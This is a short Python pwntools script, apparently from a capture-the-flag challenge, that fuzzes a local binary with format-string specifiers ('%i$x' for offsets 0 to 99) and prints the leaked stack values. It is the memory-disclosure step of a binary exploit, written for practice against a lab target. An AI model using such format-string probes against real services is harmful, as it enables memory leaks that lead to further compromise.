from pwn import *

elf = context.binary = ELF('./chall')

#io = process('./chal')
#io = remote('shelltester.challs.csc.tf', 1337)

for i in range(100):
    try:
        p = process(level='error')
        
        p.sendlineafter(b': ', f'%{i}$x'.encode())
        p.recvline()
        result = p.recvline().decode()

        if result:
            print(str(i) + ': ' + str(result).strip())
        p.close()
    
    except EOFError:
        pass